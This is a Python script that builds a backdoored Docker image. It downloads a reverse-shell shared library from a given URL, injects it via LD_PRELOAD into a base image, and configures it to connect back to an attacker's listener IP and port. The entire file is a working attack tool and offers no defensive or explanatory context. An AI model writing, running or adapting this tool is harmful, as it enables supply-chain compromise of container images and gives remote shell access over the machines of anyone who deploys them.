import argparse
import os
import requests
import tempfile
import shutil

def download_file_to_temp(url, temp_dir):
    """Download a file from a URL to a temporary file in the specified directory."""
    temp_path = os.path.join(temp_dir, 'reverse_shell.so')
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(temp_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
    print(f"Downloaded reverse_shell.so to {temp_path}")
    return temp_path

def create_dockerfile(base_image, listener_ip, listener_port, shell_path, temp_dir):
    """Create a Dockerfile in the specified directory."""
    dockerfile_path = os.path.join(temp_dir, "Dockerfile")
    dockerfile_content = f"""
FROM {base_image}
COPY reverse_shell.so /usr/share/lib/reverse_shell.so
ENV LD_PRELOAD=/usr/share/lib/reverse_shell.so
ENV REMOTE_ADDR={listener_ip}
ENV REMOTE_PORT={listener_port}

CMD ["/bin/bash", "-c", "while true; do sleep 60; done"]
    """
    with open(dockerfile_path, "w") as f:
        f.write(dockerfile_content)
    print("Dockerfile created at", dockerfile_path)
    return dockerfile_path

def build_image(output_image, temp_dir):
    """Build a Docker image from a Dockerfile within the specified directory."""
    original_dir = os.getcwd()
    os.chdir(temp_dir)  # Change to the directory where Dockerfile is located
    try:
        os.system(f"docker build -t {output_image} .")
        print(f"Image {output_image} built successfully.")
    finally:
        os.chdir(original_dir)  # Change back to the original directory

def clean_up(temp_dir):
    """Remove the temporary directory and all its contents."""
    shutil.rmtree(temp_dir)
    print(f"Temporary directory {temp_dir} has been deleted.")

def main():
    parser = argparse.ArgumentParser(description='Create a backdoored Docker image.')
    parser.add_argument('-i', '--input', required=True, help='Base Docker image to modify.')
    parser.add_argument('-o', '--output', required=True, help='Output Docker image name.')
    parser.add_argument('-l', '--listener', required=True, help='Listener IP address for reverse shell.')
    parser.add_argument('-p', '--port', required=True, type=int, help='Listener port for reverse shell.')
    parser.add_argument('--shell-url', required=True, help='URL to download the reverse shell .so file.')

    args = parser.parse_args()

    temp_dir = tempfile.mkdtemp()
    try:
        shell_path = download_file_to_temp(args.shell_url, temp_dir)
        create_dockerfile(args.input, args.listener, args.port, shell_path, temp_dir)
        build_image(args.output, temp_dir)
    finally:
        clean_up(temp_dir)

if __name__ == "__main__":
    main()
